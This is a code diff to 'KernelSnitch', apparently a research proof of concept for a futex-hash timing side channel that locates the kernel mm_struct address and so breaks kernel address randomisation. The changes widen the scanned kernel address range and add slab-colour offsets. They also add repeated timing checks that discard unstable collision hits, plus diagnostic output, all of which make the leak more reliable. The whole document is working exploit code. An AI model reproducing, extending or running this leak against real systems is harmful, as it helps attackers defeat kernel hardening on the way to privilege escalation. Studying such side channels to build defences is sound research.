@@ -39,7 +39,10 @@
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #endif
 #ifndef KERNELSNITCH_IDENTITY_END
-#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
+// Full VA39 kernel half except the top 1GB (vmalloc/modules/vmemmap region,
+// where no mm_struct slab can live). 1GB-aligned so the coarse loop cannot
+// wrap around. Hashing only, so scanning past real RAM is harmless.
+#define KERNELSNITCH_IDENTITY_END 0xffffffffc0000000ULL
 #endif
 #define IDENTITY_START KERNELSNITCH_IDENTITY_START
 #define IDENTITY_END   KERNELSNITCH_IDENTITY_END
@@ -203,11 +206,13 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
-    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+    size_t coarse_addr = range->start;
+    for (; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+            for (size_t color = 0; color <= 64 && !ks->found; color += 64) {
+            for (size_t mm_struct_candidate = slab_addr + color; (mm_struct_candidate < slab_addr + color + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
@@ -215,6 +220,8 @@ static void *__mm_leak(void *arg)
                     for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                         found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
                     if (found_hash) {
+                        if (ks->verbose)
+                            pr_info("found mm_struct %016zx\n", mm_struct_candidate);
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
                         break;
@@ -237,8 +244,12 @@ static void *__mm_leak(void *arg)
                     }
                 } 
             }
+            }
         }
     }
+    if (ks->verbose)
+        pr_info("[% 3zd] scan done coarse=%016zx end=%016llx found=%zu\n",
+                range->id, coarse_addr, (unsigned long long)range->end, ks->found);
     free(mm_leak_arg);
     return 0;
 }
@@ -301,13 +312,21 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     pin_to_core(0);
     futex_init();
 
-    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) futex_hashsize (%lu) identity [%016zx-%016zx] mte %s\n",
+    unsigned long poss_cpus = futex_possible_cpus();
+    unsigned long expected_k = poss_cpus ? futex_roundup_pow2(poss_cpus * 256UL) : 0;
+    if (ks->verbose && expected_k && expected_k > futex_hashsize)
+        pr_warning("offline futex_hashsize (%lu) < kernel expected K (%lu from %lu possible cpus): true mm would fail equality\n",
+            futex_hashsize, expected_k, poss_cpus);
+
+    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) futex_hashsize (%lu) possible (%lu) expected_K (%lu) identity [%016zx-%016zx] mte %s\n",
         ks->cpu_cnt,
         ks->mm_struct_sz,
         ks->mm_slab_order,
         ks->thread_cnt,
         ks->collisions,
         futex_hashsize,
+        poss_cpus,
+        expected_k,
         ks->identity_start,
         ks->identity_end,
         ks->mte_enabled ? "enabled" : "disabled");
@@ -335,6 +354,8 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     wanted = ks->collisions - 1;
 
     size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t thr = approx_time * KERNELSNITCH_THRESHOLD_MULT;
+    if (ks->verbose) pr_info("approx_time=%zu thr=%zu\n", approx_time, thr);
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -344,16 +365,27 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+    size_t target_time = __measure(ks->futex_addrs[0]);
+    if (ks->verbose) pr_info("target_time=%zu thr=%zu\n", target_time, thr);
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-            count++;
-            ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
+        if (ks->times[i] > thr) {
+            size_t t2 = __measure(futex_addr);
+            size_t t3 = __measure(futex_addr);
+            if (t2 > thr && t3 > thr) {
+                count++;
+                ks->futex_addrs[count] = futex_addr;
+                if (ks->verbose)
+                    pr_info("  %016zx i=%zu t=%zu/%zu/%zu\n", futex_addr, i,
+                            ks->times[i], t2, t3);
+            } else if (ks->verbose) {
+                pr_info("  reject unstable %016zx i=%zu t=%zu/%zu/%zu\n",
+                        futex_addr, i, ks->times[i], t2, t3);
+            }
         }
     }
     if (wanted == count) {
@@ -362,6 +394,23 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     } else {
         pr_warning("only found %zd collisions -> cannot continue\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+    }
+    if (ks->verbose) {
+        // Release our 4096 waiter pile, then re-measure in this same mm.
+        // Genuine pile: bucket empties -> target/hits drop to ~baseline.
+        // False-positive bucket (foreign waiters): times stay slow.
+        __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL, NULL, 0);
+        usleep(50000);
+        size_t base = __measure((size_t)&ks->futexes[0]);
+        size_t base2 = __measure((size_t)&ks->futexes[KS_PAGE_SIZE]);
+        size_t base3 = __measure((size_t)&ks->futexes[KS_PAGE_SIZE + 8]);
+        if (base2 < base) base = base2;
+        if (base3 < base) base = base3;
+        pr_info("post-pile baseline=%zu target=%zu count=%zu\n",
+                base, __measure(ks->futex_addrs[0]), count);
+        for (size_t i = 1; i <= count && i <= ks->collisions; ++i)
+            pr_info("post-pile[%zu] %016zx t=%zu\n", i, ks->futex_addrs[i],
+                    __measure(ks->futex_addrs[i]));
     }
 }
 size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
